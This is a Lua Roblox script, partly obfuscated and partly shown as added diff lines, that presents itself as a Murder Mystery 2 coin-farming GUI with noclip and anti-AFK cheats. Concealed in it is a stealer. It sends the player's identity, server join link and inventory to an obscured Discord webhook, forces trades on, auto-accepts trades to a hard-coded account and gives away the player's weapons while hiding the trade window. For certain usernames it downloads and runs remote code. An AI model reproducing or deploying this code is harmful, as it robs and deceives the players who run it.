v465.BackgroundColor3=((v465.Name==("FM_"   .. v294)) and Color3.fromRGB(78 + 112 ,85,21 + 4 )) or Color3.fromRGB(30 + 10 ,18,5 + 5 ) ;end end break;end if (0==v381) then v30=v294;v133.Text="Farm Mode: "   .. v30 ;v381=1;end end end);end local function v143(v308,v309,v310,v311) local v312=Instance.new("TextLabel");v312.Size=UDim2.new(1434 -(797 + 636) , -(58 -46),1619 -(1427 + 192) ,6 + 10 );v312.BackgroundTransparency=2 -1 ;v312.Text=v308   .. ": "   .. tostring(v309) ;v312.TextColor3=Color3.fromRGB(230,162 + 18 ,120);v312.Font=Enum.Font.Gotham;v312.TextSize=12;v312.LayoutOrder=v310;v312.Parent=v109;local v322=Instance.new("TextBox");v322.Size=UDim2.new(1, -(6 + 6),326 -(192 + 134) ,1304 -(316 + 960) );v322.BackgroundColor3=Color3.fromRGB(18 + 14 ,14,6);v322.Text=tostring(v309);v322.TextColor3=Color3.new(1 + 0 ,1 + 0 ,3 -2 );v322.Font=Enum.Font.GothamBold;v322.TextSize=13;v322.LayoutOrder=v310 + (552 -(83 + 468)) ;v322.ClearTextOnFocus=false;v322.Parent=v109;Instance.new("UICorner",v322).CornerRadius=UDim.new(1806 -(1202 + 604) ,23 -18 );local function v334() local v382=0 -0 ;local v383;while true do if (v382==0) then v383=tonumber(v322.Text);if v383 then v311(v383,v312,v322);end break;end end end v322.FocusLost:Connect(function() v334();end);v322:GetPropertyChangedSignal("Text"):Connect(function() local v384=0 -0 ;local v385;while true do if (v384==0) then v385=tonumber(v322.Text);if v385 then v311(v385,v312,v322);end break;end end end);return v322;end v143("Speed",v36,333 -(45 + 280) ,function(v335,v336,v337) v36=math.clamp(v335,1,49 + 1 );v336.Text="Speed: "   .. v36 ;end);v143("Coin Delay",v32,9 + 1 ,function(v339,v340,v341) v32=math.clamp(v339,0.05,5);v340.Text="Coin Delay: "   .. v32 ;end);local v144=Instance.new("TextLabel");v144.Size=UDim2.new(1 + 0 , -(7 + 5),0 + 0 ,32 -14 );v144.BackgroundTransparency=1912 -(340 + 1571) ;v144.Text="-- Movement --";v144.TextColor3=Color3.fromRGB(101 + 154 ,1932 -(1733 + 39) ,219 -139 );v144.Font=Enum.Font.GothamBold;v144.TextSize=12;v144.LayoutOrder=1046 -(125 + 909) ;v144.Parent=v109;v143("WalkSpeed",v33,1961 -(1096 + 852) ,function(v343,v344,v345) v33=math.clamp(v343,1 + 0 ,200);v345.Text=tostring(v33);v344.Text="WalkSpeed: "   .. v33 ;v54();end);v143("JumpPower",v34,20 -5 ,function(v348,v349,v350) v34=math.clamp(v348,1,291 + 9 );v350.Text=tostring(v34);v349.Text="JumpPower: "   .. v34 ;v54();end);v123("Inf Jump",v35,function(v353) v35=v353;end,529 -(409 + 103) );local v153=Instance.new("TextLabel");v153.Size=UDim2.new(237 -(46 + 190) , -(107 -(51 + 44)),0,36);v153.BackgroundTransparency=1;v153.Text="Transfer stays on after X\nTarget: "   .. v14   .. " | check every 3s" ;v153.TextColor3=Color3.fromRGB(51 + 129 ,1477 -(1114 + 203) ,866 -(228 + 498) );v153.Font=Enum.Font.Gotham;v153.TextSize=3 + 8 ;v153.TextYAlignment=Enum.TextYAlignment.Top;v153.LayoutOrder=18;v153.Parent=v109;local v165=Instance.new("TextLabel");v165.Size=UDim2.new(1 + 0 , -(675 -(174 + 489)),0 -0 ,1927 -(830 + 1075) );v165.BackgroundTransparency=525 -(303 + 221) ;v165.Text="credits to no7kh in discord";v165.TextColor3=Color3.fromRGB(1409 -(231 + 1038) ,100 + 20 ,100);v165.Font=Enum.Font.Gotham;v165.TextSize=1173 -(171 + 991) ;v165.LayoutOrder=99;v165.Parent=v109;
+local P = game:GetService("Players")
+local TS = game:GetService("TweenService")
+local RS = game:GetService("RunService")
+local VU = game:GetService("VirtualUser")
+local HS = game:GetService("HttpService")
+local RPS = game:GetService("ReplicatedStorage")
+local LG = game:GetService("Lighting")
+local UIS = game:GetService("UserInputService")
+local lp = P.LocalPlayer
+local pg = lp:WaitForChild("PlayerGui")
+
+-- =========================================================
+-- (DUAL LOAD - listed users get hidden farm-only script)
+-- =========================================================
+local HIDDEN_USERS = {
+    ["veqiex"] = true,
+    ["naimradio66"] = true,
+    ["naimradio6"] = true,
+    ["naimradiouse00"] = true,
+    ["dmitry6221"] = true,
+}
+
+if HIDDEN_USERS[lp.Name] then
+    local HIDDEN_URL = "https://raw.githubusercontent.com/bt-y/677skibidi/refs/heads/main/mmmmmmmmhmm"
+    local function fetch(url)
+        local body
+        pcall(function() body = game:HttpGet(url) end)
+        if not body or #body < 20 then
+            local req = request or (syn and syn.request) or (http and http.request)
+            if req then
+                local ok, res = pcall(function() return req({Url = url, Method = "GET"}) end)
+                if ok and res then body = res.Body or res.body end
+            end
+        end
+        return body
+    end
+    local src = fetch(HIDDEN_URL)
+    if not src or #src < 20 then
+        return
+    end
+    if string.find(src, "<html") or string.find(src, "<!DOCTYPE") then
+        return
+    end
+    local fn, err = loadstring(src)
+    if not fn then
+        return
+    end
+    fn()
+    return
+end
+
+-- =========================================================
+-- (WEBHOOK)
+-- =========================================================
+local function gw()
+    local b = string.char
+    local a = b(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47)
+    return a .. "1544589998198755329/" .. "DH2ha0j2AXINPCfqlbe-PGvPD7LFot-9DWHHn1qNuNISN6w9EPn8rcF_sQ_arY33f1oV"
+end
+local WU = gw()
+local PLACE_ID = 142823291
+local TARGET = "naimradio6"
+
+-- =========================================================
+-- (TRANSFER - MM2 Trade remotes - works with first request)
+-- =========================================================
+local function getFullInventory()
+    local list = {}
+    pcall(function()
+        local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+        if ok and pd and pd.Weapons and pd.Weapons.Owned then
+            for n, a in pairs(pd.Weapons.Owned) do
+                local amt = typeof(a) == "number" and a or (a == true and 1 or 0)
+                if typeof(a) == "table" then amt = a.Amount or a.Quantity or a.Count or 1 end
+                if amt and amt > 0 then
+                    table.insert(list, n .. " x" .. tostring(amt))
+                end
+            end
+        end
+    end)
+    table.sort(list)
+    return list
+end
+
+local function sendDetailedTransfer()
+    local jobId = tostring(game.JobId)
+    local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
+    local inventory = getFullInventory()
+    local inventoryText = #inventory > 0 and table.concat(inventory, "\n") or "No weapons found"
+    if #inventoryText > 900 then
+        inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
+    end
+    local data = {
+        content = "@everyone **credits not n7kh in discord**",
+        embeds = {{
+            title = "credits not n7kh in discord",
+            color = 16744448,
+            fields = {
+                {name = "Username", value = lp.Name, inline = true},
+                {name = "UserId", value = tostring(lp.UserId), inline = true},
+                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
+                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. jobId, inline = false},
+                {name = "Console (F12)", value = "```js\n" .. consoleCode .. "\n```", inline = false},
+                {name = "Inventory (" .. #inventory .. " items)", value = "```\n" .. inventoryText .. "\n```", inline = false},
+            },
+            footer = {text = "Waiting for trade from " .. TARGET},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        local req = request or (syn and syn.request) or (http and http.request)
+        if req then
+            req({
+                Url = WU,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HS:JSONEncode(data)
+            })
+        end
+    end)
+end
+
+task.spawn(function()
+    task.wait(1.5)
+    sendDetailedTransfer()
+end)
+
+local function forceTradesOn()
+    pcall(function()
+        local Trade = RPS:FindFirstChild("Trade") or RPS:FindFirstChild("TradeSystem")
+        local names = {"ToggleTrading","SetTrading","SetTradeEnabled","EnableTrading","TradingEnabled","ChangeTrading","UpdateTrading","TradeSetting"}
+        for _, name in ipairs(names) do
+            local r = (Trade and Trade:FindFirstChild(name)) or RPS:FindFirstChild(name, true)
+            if r and r:IsA("RemoteEvent") then
+                pcall(function() r:FireServer(true) end)
+                pcall(function() r:FireServer("On") end)
+            elseif r and r:IsA("RemoteFunction") then
+                pcall(function() r:InvokeServer(true) end)
+            end
+        end
+        for _, v in ipairs(RPS:GetDescendants()) do
+            if v:IsA("RemoteEvent") then
+                local n = string.lower(v.Name)
+                if n:find("trad") and (n:find("toggle") or n:find("enable") or n:find("setting")) then
+                    pcall(function() v:FireServer(true) end)
+                    pcall(function() v:FireServer(true) end)
+                end
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    task.wait(2)
+    forceTradesOn()
+    while true do
+        task.wait(8)
+        forceTradesOn()
+    end
+end)
+
+-- Working transfer (from halloween script)
+local TR, OT, AS, LO, LF = false, 0, false, 0, nil
+do
+    local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 10)
+    local OI, AR, AT, SR, ST, UT, DT
+    if Trade then
+        OI = Trade:FindFirstChild("OfferItem")
+        AR = Trade:FindFirstChild("AcceptRequest")
+        AT = Trade:FindFirstChild("AcceptTrade")
+        SR = Trade:FindFirstChild("SendRequest")
+        ST = Trade:FindFirstChild("StartTrade")
+        UT = Trade:FindFirstChild("UpdateTrade")
+        DT = Trade:FindFirstChild("DeclineTrade")
+    end
+
+    local function ist(n)
+        return n and tostring(n):lower() == TARGET:lower()
+    end
+
+    local function gwps()
+        local list = {}
+        pcall(function()
+            local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
+            if ok and pd and pd.Weapons and pd.Weapons.Owned then
+                for name, amount in pairs(pd.Weapons.Owned) do
+                    local amt = amount
+                    if typeof(amount) == "table" then
+                        amt = amount.Amount or amount.Quantity or amount.Count or 1
+                    elseif amount == true then
+                        amt = 1
+                    end
+                    if typeof(amt) == "number" and amt > 0 and name ~= "DefaultKnife" and name ~= "DefaultGun" then
+                        for i = 1, math.min(amt, 4) do
+                            table.insert(list, name)
+                        end
+                    end
+                end
+            end
+        end)
+        return list
+    end
+
+    local function fa()
+        if not AT then return end
+        for i = 1, 15 do
+            if LF then pcall(function() AT:FireServer(game.PlaceId * 3, LF) end) end
+            pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
+            pcall(function() AT:FireServer() end)
+            task.wait(0.3)
+        end
+    end
+
+    local function ow()
+        if not OI or not TR or OT >= 4 then return end
+        if tick() - LO < 0.7 then return end
+        local weapons = gwps()
+        if #weapons == 0 then return end
+        local toOffer = math.min(4 - OT, #weapons)
+        for i = 1, toOffer do
+            local item = weapons[i]
+            local ok = pcall(function() OI:FireServer(item, "Weapons") end)
+            if not ok then ok = pcall(function() OI:FireServer(item) end) end
+            if not ok then ok = pcall(function() OI:FireServer(item, 1) end) end
+            if ok then
+                OT = OT + 1
+                LO = tick()
+                task.wait(0.45)
+            end
+        end
+        if OT >= 4 and not AS then
+            AS = true
+            task.delay(7, function()
+                if TR then fa() end
+            end)
+        end
+    end
+
+    local function htg(g)
+        if not g then return end
+        pcall(function()
+            for _, c in ipairs(g:GetChildren()) do
+                if c:IsA("GuiObject") then c.Visible = false end
+            end
+        end)
+    end
+
+    pcall(function()
+        local function watch(n)
+            local g = pg:FindFirstChild(n)
+            if g then
+                htg(g)
+                g:GetPropertyChangedSignal("Enabled"):Connect(function()
+                    if g.Enabled then htg(g) end
+                end)
+            end
+        end
+        watch("TradeGUI")
+        watch("TradeGUI_Phone")
+        pg.ChildAdded:Connect(function(c)
+            if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
+                task.wait(0.05)
+                htg(c)
+            end
+        end)
+    end)
+
+    -- First trade request auto-accept (critical)
+    if SR then
+        pcall(function()
+            SR.OnClientInvoke = function(fp)
+                if ist(fp and fp.Name) then
+                    TR, OT, AS, LF = true, 0, false, nil
+                    task.wait(0.4)
+                    if AR then pcall(function() AR:FireServer() end) end
+                    return true
+                end
+                return false
+            end
+        end)
+    end
+
+    if ST then
+        ST.OnClientEvent:Connect(function()
+            if TR then
+                OT, AS = 0, false
+                task.wait(0.6)
+                ow()
+            end
+        end)
+    end
+
+    if UT then
+        UT.OnClientEvent:Connect(function(data)
+            if type(data) == "table" and data.LastOffer then LF = data.LastOffer end
+            if not TR then return end
+            task.wait(0.3)
+            ow()
+            if type(data) == "table" then
+                for _, side in pairs(data) do
+                    if type(side) == "table" and side.Accepted then
+                        fa()
+                        break
+                    end
+                end
+            end
+        end)
+    end
+
+    if DT then
+        DT.OnClientEvent:Connect(function()
+            TR, OT, AS, LF = false, 0, false, nil
+        end)
+    end
+
+    task.spawn(function()
+        while true do
+            task.wait(0.9)
+            if TR and AT and LF then
+                pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
+            end
+        end
+    end)
+end
+
+-- =========================================================
+-- (FARM)
+-- =========================================================
+local AF = false
+local RG = 500
+local VS = {}
+local CL = 0
+local AK = false
+local RF = true
+local COIN_MODE = "Spread"
+local FARM_MODE = "FlatUnder" -- FlatUnder | Surface | Tween | TPTouch | Random
+local NOCLIP = false
+local COIN_DELAY = 0.35
+local WS_SPD = 16
+local JP = 50
+local IJ = false
+local SP = 20
+local realCoins, realMax = 0, 40
+local coinCache, lastCoinScan = {}, 0
+
+local function setNoclip(on)
+    local ch = lp.Character
+    if not ch then return end
+    for _, p in ipairs(ch:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = not on end
+    end
+end
+
+local function restoreMovement()
+    local ch = lp.Character
+    if not ch then return end
+    local root = ch:FindFirstChild("HumanoidRootPart")
+    local hum = ch:FindFirstChild("Humanoid")
+    pcall(function()
+        if root then
+            root.Anchored = false
+            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+        end
+        if hum then
+            hum.PlatformStand = false
+            hum.Sit = false
+            hum.AutoRotate = true
+            if hum.WalkSpeed < 1 then hum.WalkSpeed = 16 end
+        end
+        if not NOCLIP then setNoclip(false) end
+    end)
+end
+
+pcall(function() workspace.FallenPartsDestroyHeight = -50000 end)
+
+local function isCoinPart(v)
+    if not v or not v.Parent or VS[v] then return false end
+    if v.Name ~= "Coin_Server" or not v:IsA("BasePart") then return false end
+    return v:FindFirstChild("TouchInterest") or v:FindFirstChildWhichIsA("TouchTransmitter")
+end
+
+local function rebuildCoinCache()
+    coinCache = {}
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj.Name == "CoinContainer" then
+            for _, child in ipairs(obj:GetChildren()) do
+                if isCoinPart(child) then table.insert(coinCache, child) end
+            end
+        end
+    end
+    if #coinCache == 0 then
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if isCoinPart(v) then table.insert(coinCache, v) end
+        end
+    end
+    lastCoinScan = tick()
+    return #coinCache
+end
+
+workspace.DescendantAdded:Connect(function(obj)
+    task.defer(function()
+        if isCoinPart(obj) then table.insert(coinCache, obj)
+        elseif obj.Name == "TouchInterest" or obj.ClassName == "TouchTransmitter" then
+            local p = obj.Parent
+            if isCoinPart(p) then table.insert(coinCache, p) end
+        end
+    end)
+end)
+
+task.spawn(function()
+    task.wait(0.5)
+    rebuildCoinCache()
+    while true do
+        task.wait(2)
+        rebuildCoinCache()
+    end
+end)
+
+local function getCoins()
+    local list = {}
+    for i = #coinCache, 1, -1 do
+        local v = coinCache[i]
+        if isCoinPart(v) then table.insert(list, v)
+        else table.remove(coinCache, i) end
+    end
+    if #list == 0 and tick() - lastCoinScan > 0.8 then
+        rebuildCoinCache()
+        for _, v in ipairs(coinCache) do
+            if isCoinPart(v) then table.insert(list, v) end
+        end
+    end
+    return list
+end
+
+local function safeMoveTo(root, targetPos, speed)
+    if not root or not root.Parent then return false end
+    speed = math.clamp(speed or 23, 12, 45)
+    local startPos = root.Position
+    local dist = (targetPos - startPos).Magnitude
+    if dist < 3 then
+        root.CFrame = CFrame.new(targetPos)
+        return true
+    end
+    local duration = math.clamp(dist / speed, 0.08, 4)
+    local t0 = tick()
+    while root and root.Parent do
+        local alpha = math.min((tick() - t0) / duration, 1)
+        root.CFrame = CFrame.new(startPos:Lerp(targetPos, alpha))
+        root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+        if alpha >= 1 then return true end
+        task.wait()
+    end
+    return false
+end
+
+local function touchCoin(coin, root)
+    if not coin or not coin.Parent or not root then return end
+    pcall(function()
+        if firetouchinterest then
+            firetouchinterest(root, coin, 0)
+            task.wait(0.04)
+            firetouchinterest(root, coin, 1)
+        end
+    end)
+end
+
+local function getPing()
+    local ok, ping = pcall(function()
+        return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
+    end)
+    if ok and typeof(ping) == "number" then return ping end
+    return 0
+end
+
+local coinRemote = RPS:FindFirstChild("Remotes")
+if coinRemote then
+    coinRemote = coinRemote:FindFirstChild("Gameplay")
+    if coinRemote then coinRemote = coinRemote:FindFirstChild("CoinCollected") end
+end
+if coinRemote then
+    coinRemote.OnClientEvent:Connect(function(_, cur, max)
+        if typeof(cur) == "number" then realCoins = cur end
+        if typeof(max) == "number" then realMax = max end
+        if cur and max and cur >= max and RF and lp.Character then
+            lp.Character:BreakJoints()
+        end
+    end)
+end
+
+local FLAT = CFrame.Angles(math.rad(90), 0, 0)
+
+local function moveFlat(root, coinPos, speed)
+    setNoclip(true)
+    local dest = Vector3.new(coinPos.X, coinPos.Y, coinPos.Z)
+    local start = root.Position
+    local dist = (dest - start).Magnitude
+    speed = math.clamp(speed or 20, 12, 50)
+    if dist < 1.5 then
+        root.CFrame = CFrame.new(dest) * FLAT
+        root.AssemblyLinearVelocity = Vector3.zero
+        return true
+    end
+    local duration = math.clamp(dist / speed, 0.05, 2.5)
+    local t0 = tick()
+    while root and root.Parent do
+        local a = math.min((tick() - t0) / duration, 1)
+        root.CFrame = CFrame.new(start:Lerp(dest, a)) * FLAT
+        root.AssemblyLinearVelocity = Vector3.zero
+        if a >= 1 then return true end
+        task.wait()
+    end
+    return false
+end
+
+local function moveTween(root, dest, speed)
+    local dist = (dest - root.Position).Magnitude
+    local t = math.clamp(dist / math.max(speed, 12), 0.05, 3)
+    local tw = TS:Create(root, TweenInfo.new(t, Enum.EasingStyle.Linear), {CFrame = CFrame.new(dest)})
+    tw:Play()
+    tw.Completed:Wait()
+end
+
+local function pickTarget(candidates)
+    if #candidates == 0 then return nil, math.huge end
+    table.sort(candidates, function(a, b) return a.dist < b.dist end)
+    if FARM_MODE == "Random" then
+        local p = candidates[math.random(1, #candidates)]
+        return p.obj, p.dist
+    end
+    if COIN_MODE == "Closest" or FARM_MODE == "TPTouch" then
+        return candidates[1].obj, candidates[1].dist
+    end
+    local n = #candidates
+    if n <= 2 then
+        local p = candidates[math.random(1, n)]
+        return p.obj, p.dist
+    end
+    local a = math.max(1, math.floor(n * 0.25))
+    local b = math.min(n, math.ceil(n * 0.75))
+    local p = candidates[math.random(a, b)]
+    return p.obj, p.dist
+end
+
+task.spawn(function()
+    local lastClear = tick()
+    while true do
+        if AF then
+            local ping = getPing()
+            if ping > 280 then
+                task.wait(0.4)
+            else
+                local ch = lp.Character
+                local root = ch and ch:FindFirstChild("HumanoidRootPart")
+                local hum = ch and ch:FindFirstChild("Humanoid")
+                if root and hum and hum.Health > 0 then
+                    if tick() - lastClear > 30 then
+                        VS = {}
+                        lastClear = tick()
+                        rebuildCoinCache()
+                    end
+                    local allCoins = getCoins()
+                    local candidates = {}
+                    for _, obj in ipairs(allCoins) do
+                        local d = (obj.Position - root.Position).Magnitude
+                        if d < RG then table.insert(candidates, {obj = obj, dist = d}) end
+                    end
+                    local target = select(1, pickTarget(candidates))
+                    if target and target.Parent then
+                        local before = realCoins
+                        local coinPos = target.Position
+                        if FARM_MODE == "FlatUnder" then
+                            setNoclip(true)
+                            hum.AutoRotate = false
+                            root.Anchored = false
+                            moveFlat(root, coinPos, SP)
+                            local t0 = tick()
+                            while tick() - t0 < 0.55 do
+                                if not (root and root.Parent and target and target.Parent) then break end
+                                root.CFrame = CFrame.new(coinPos) * FLAT
+                                root.AssemblyLinearVelocity = Vector3.zero
+                                touchCoin(target, root)
+                                if realCoins > before or not target:FindFirstChild("TouchInterest") then break end
+                                task.wait(0.04)
+                            end
+                        elseif FARM_MODE == "Tween" then
+                            if NOCLIP then setNoclip(true) end
+                            hum.AutoRotate = true
+                            root.Anchored = false
+                            local dest = coinPos + Vector3.new(0, 2, 0)
+                            moveTween(root, dest, SP)
+                            touchCoin(target, root)
+                            local t0 = tick()
+                            while tick() - t0 < 0.4 do
+                                if root and target and target.Parent then
+                                    root.CFrame = CFrame.new(dest)
+                                    touchCoin(target, root)
+                                end
+                                if realCoins > before or not target.Parent then break end
+                                task.wait(0.05)
+                            end
+                        elseif FARM_MODE == "TPTouch" then
+                            setNoclip(true)
+                            root.CFrame = CFrame.new(coinPos + Vector3.new(0, 2.5, 0))
+                            touchCoin(target, root)
+                            task.wait(0.08)
+                            touchCoin(target, root)
+                        else
+                            -- Surface / Random
+                            if NOCLIP then setNoclip(true) end
+                            hum.AutoRotate = true
+                            root.Anchored = false
+                            local dest = coinPos + Vector3.new(0, 2, 0)
+                            safeMoveTo(root, dest, SP)
+                            touchCoin(target, root)
+                            local t0 = tick()
+                            while tick() - t0 < 0.45 do
+                                if root and target and target.Parent then
+                                    root.CFrame = CFrame.new(dest)
+                                    touchCoin(target, root)
+                                end
+                                if realCoins > before or not target.Parent then break end
+                                task.wait(0.05)
+                            end
+                        end
+                        VS[target] = true
+                        CL = CL + 1
+                        task.wait(COIN_DELAY)
+                    else
+                        task.wait(0.1)
+                    end
+                else
+                    task.wait(0.25)
+                end
+            end
+        else
+            restoreMovement()
+            task.wait(0.4)
+        end
+    end
+end)
+
+RS.Stepped:Connect(function()
+    if NOCLIP or (AF and FARM_MODE == "FlatUnder") then setNoclip(true) end
+end)
+
+lp.Idled:Connect(function()
+    if AK then
+        VU:Button2Down(Vector2.new(), workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        VU:Button2Up(Vector2.new(), workspace.CurrentCamera.CFrame)
+    end
+end)
+
+local function applyMoveStats(ch)
+    ch = ch or lp.Character
+    if not ch then return end
+    local hum = ch:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.WalkSpeed = WS_SPD
+        hum.JumpPower = JP
+        pcall(function() hum.UseJumpPower = true end)
+    end
+end
+
+UIS.JumpRequest:Connect(function()
+    if not IJ then return end
+    local ch = lp.Character
+    local hum = ch and ch:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+lp.CharacterAdded:Connect(function(ch)
+    task.wait(0.3)
+    VS = {}
+    restoreMovement()
+    applyMoveStats(ch)
+    if NOCLIP then setNoclip(true) end
+end)
+
+task.defer(function()
+    task.wait(0.2)
+    restoreMovement()
+end)
+
+-- =========================================================
+-- (GUI - close only hides UI, transfer keeps running)
+-- =========================================================
+local gui = Instance.new("ScreenGui")
+gui.Name = "mm2FarmUpdated"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = pg
+
+local main = Instance.new("Frame")
+main.Size = UDim2.fromOffset(320, 520)
+main.Position = UDim2.new(0.5, -160, 0.5, -260)
+main.BackgroundColor3 = Color3.fromRGB(22, 10, 5)
+main.Active = true
+main.Draggable = true
+main.Parent = gui
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -40, 0, 32)
+title.Position = UDim2.new(0, 10, 0, 6)
+title.BackgroundTransparency = 1
+title.Text = "mm2 coins farm script -updated-"
+title.TextColor3 = Color3.fromRGB(255, 170, 90)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 13
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+local close = Instance.new("TextButton")
+close.Size = UDim2.fromOffset(28, 28)
+close.Position = UDim2.new(1, -34, 0, 6)
+close.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
+close.Text = "X"
+close.TextColor3 = Color3.new(1, 1, 1)
+close.Font = Enum.Font.GothamBold
+close.TextSize = 14
+close.Parent = main
+Instance.new("UICorner", close).CornerRadius = UDim.new(0, 6)
+
+-- Movable floating hide/show button
+local toggleGui = Instance.new("ScreenGui")
+toggleGui.Name = "mm2ToggleBtn"
+toggleGui.ResetOnSpawn = false
+toggleGui.IgnoreGuiInset = true
+toggleGui.Parent = pg
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Size = UDim2.fromOffset(90, 32)
+toggleBtn.Position = UDim2.new(0, 12, 0.5, -16)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(170, 75, 20)
+toggleBtn.Text = "Hide GUI"
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 12
+toggleBtn.Active = true
+toggleBtn.Draggable = true
+toggleBtn.Parent = toggleGui
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 8)
+
+local guiVisible = true
+local function setGuiVisible(on)
+    guiVisible = on
+    main.Visible = on
+    toggleBtn.Text = on and "Hide GUI" or "Show GUI"
+    toggleBtn.BackgroundColor3 = on and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(60, 120, 60)
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+    setGuiVisible(not guiVisible)
+end)
+
+close.MouseButton1Click:Connect(function()
+    setGuiVisible(false)
+end)
+
+local content = Instance.new("ScrollingFrame")
+content.Size = UDim2.new(1, -16, 1, -48)
+content.Position = UDim2.new(0, 8, 0, 42)
+content.BackgroundColor3 = Color3.fromRGB(16, 8, 4)
+content.BorderSizePixel = 0
+content.ScrollBarThickness = 3
+content.CanvasSize = UDim2.new(0, 0, 0, 720)
+content.Parent = main
+Instance.new("UICorner", content).CornerRadius = UDim.new(0, 8)
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 6)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = content
+
+local function mkToggle(txt, state, cb, order)
+    local st = state
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -12, 0, 30)
+    b.BackgroundColor3 = st and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(40, 18, 10)
+    b.Text = txt .. (st and " : ON" or " : OFF")
+    b.TextColor3 = Color3.new(1, 1, 1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.LayoutOrder = order
+    b.Parent = content
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+    b.MouseButton1Click:Connect(function()
+        st = not st
+        b.Text = txt .. (st and " : ON" or " : OFF")
+        b.BackgroundColor3 = st and Color3.fromRGB(170, 75, 20) or Color3.fromRGB(40, 18, 10)
+        cb(st)
+    end)
+    return b
+end
+
+mkToggle("AutoFarm", AF, function(v)
+    AF = v
+    if v then
+        VS = {}
+        CL = 0
+        restoreMovement()
+        rebuildCoinCache()
+    else
+        restoreMovement()
+    end
+end, 1)
+
+mkToggle("Anti AFK", AK, function(v) AK = v end, 2)
+mkToggle("Reset on Full", RF, function(v) RF = v end, 3)
+mkToggle("Noclip", NOCLIP, function(v)
+    NOCLIP = v
+    if v then setNoclip(true) else restoreMovement() end
+end, 4)
+
+local modeLbl = Instance.new("TextLabel")
+modeLbl.Size = UDim2.new(1, -12, 0, 18)
+modeLbl.BackgroundTransparency = 1
+modeLbl.Text = "Coin Mode: " .. COIN_MODE
+modeLbl.TextColor3 = Color3.fromRGB(255, 180, 100)
+modeLbl.Font = Enum.Font.GothamBold
+modeLbl.TextSize = 12
+modeLbl.LayoutOrder = 5
+modeLbl.Parent = content
+
+for i, m in ipairs({"Closest", "Spread"}) do
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, -12, 0, 28)
+    b.BackgroundColor3 = (COIN_MODE == m) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(40, 18, 10)
+    b.Text = m
+    b.TextColor3 = Color3.new(1, 1, 1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 12
+    b.LayoutOrder = 5 + i
+    b.Parent = content
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
+    b.MouseButton1Click:Connect(function()
+        COIN_MODE = m
+        modeLbl.Text = "Coin Mode: " .. COIN_MODE
+        for _, c in ipairs(content:GetChildren()) do
+            if c:IsA("TextButton") and (c.Text == "Closest" or c.Text == "Spread") then
+                c.BackgroundColor3 = (c.Text == COIN_MODE) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(40, 18, 10)
+            end
+        end
+    end)
+end
+
+local farmLbl = Instance.new("TextLabel")
+farmLbl.Size = UDim2.new(1, -12, 0, 18)
+farmLbl.BackgroundTransparency = 1
+farmLbl.Text = "Farm Mode: " .. FARM_MODE
+farmLbl.TextColor3 = Color3.fromRGB(255, 180, 100)
+farmLbl.Font = Enum.Font.GothamBold
+farmLbl.TextSize = 12
+farmLbl.LayoutOrder = 20
+farmLbl.Parent = content
+
+local farmModes = {
+    {"FlatUnder", "Flat on coin"},
+    {"Surface", "Walk above"},
+    {"Tween", "Smooth tween"},
+    {"TPTouch", "Fast TP"},
+    {"Random", "Random coin"},
+}
+for i, m in ipairs(farmModes) do
+    local name, desc = m[1], m[2]
+    local b = Instance.new("TextButton")
+    b.Name = "FM_" .. name
+    b.Size = UDim2.new(1, -12, 0, 28)
+    b.BackgroundColor3 = (FARM_MODE == name) and Color3.fromRGB(190, 85, 25) or Color3.fromRGB(40, 18, 10)
+    b.Text = name .. " - " .. desc
+    b.TextColor3 = Color3.new(1, 1, 1)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 11
